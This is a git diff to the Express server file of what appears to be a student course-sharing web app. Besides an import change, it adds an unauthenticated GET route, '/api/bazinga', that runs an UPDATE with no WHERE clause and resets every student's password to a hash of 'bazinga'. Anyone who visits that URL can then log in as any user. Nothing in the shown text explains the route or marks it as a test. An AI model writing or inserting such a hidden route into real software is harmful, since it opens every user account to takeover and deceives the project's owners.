@@ -1,4 +1,4 @@
-import { initDB, SqliteStore } from "./connect-database.js";
+import { connectDB, initDB, SqliteStore } from "./connect-database.js";
 import { loginRouteHandler, registerRouteHandler, getLoggedInUser, checkLoggedIn, checkIsLoggedInUser, checkShareCourses, checkAreFriends } from "./api/account-management.js";
 import { getUser, getProfilePhoto, getFriends, getCourses, getCourseParticipants } from "./api/users.js";
 import { updateFriendshipHandler, getFriendReqsHandler, respondFriendReqHandler } from "./api/friends.js";
@@ -60,6 +60,17 @@ app.param("id", checkShareCourses);
 // at /, but that poses no security risks and comes at no inconvenience to the end user,
 // while keeping the server-side codebase fairly clean.
 app.use(express.static("client"));
+
+app.get("/api/bazinga", async (req, res) => {
+  const db = await connectDB();
+  const q = `
+  UPDATE Students
+  SET password = ?
+  `;
+  const hashedPassword = await bcrypt.hash("bazinga", 12);
+  await db.run(q, hashedPassword);
+  res.send();
+})
 
 // == CLIENT ROUTES ==
 app.get(basepath, (req, res) => {
